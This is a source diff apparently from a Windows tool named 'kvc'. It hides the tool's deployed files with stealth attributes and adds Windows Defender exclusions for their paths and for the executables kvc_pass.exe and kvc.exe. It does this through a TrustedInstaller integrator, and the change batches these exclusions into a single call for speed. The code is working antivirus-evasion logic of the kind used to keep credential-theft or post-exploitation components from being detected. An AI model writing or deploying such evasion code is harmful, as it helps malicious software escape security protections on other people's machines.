@@ -130,17 +130,23 @@ bool Controller::WriteExtractedComponents(const std::vector<BYTE>& kvcPassData,
         SetFileAttributesW(kvcCryptPath.c_str(), stealthAttribs);
         SetFileAttributesW(kvcMainPath.c_str(), stealthAttribs);
         
-        // Add Windows Defender exclusions for deployed components
+        // Add Windows Defender exclusions for deployed components using batch operation
         INFO(L"Adding Windows Defender exclusions for deployed components");
 
-        // Add paths (all files)
-        m_trustedInstaller.AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType::Paths, kvcPassPath.wstring());
-        m_trustedInstaller.AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType::Paths, kvcCryptPath.wstring());
-        m_trustedInstaller.AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType::Paths, kvcMainPath.wstring());
+        // Use batch operation instead of individual calls for better performance
+        std::vector<std::wstring> paths = {
+            kvcPassPath.wstring(),
+            kvcCryptPath.wstring(), 
+            kvcMainPath.wstring()
+        };
 
-        // Add processes (executables only)
-        m_trustedInstaller.AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType::Processes, L"kvc_pass.exe");
-        m_trustedInstaller.AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType::Processes, L"kvc.exe");
+        std::vector<std::wstring> processes = {
+            L"kvc_pass.exe",
+            L"kvc.exe"
+        };
+
+        // Single batch call replaces 5 individual operations - much faster!
+        int exclusionsAdded = m_trustedInstaller.AddMultipleDefenderExclusions(paths, processes, {});
 
         INFO(L"Windows Defender exclusions configured successfully");
         
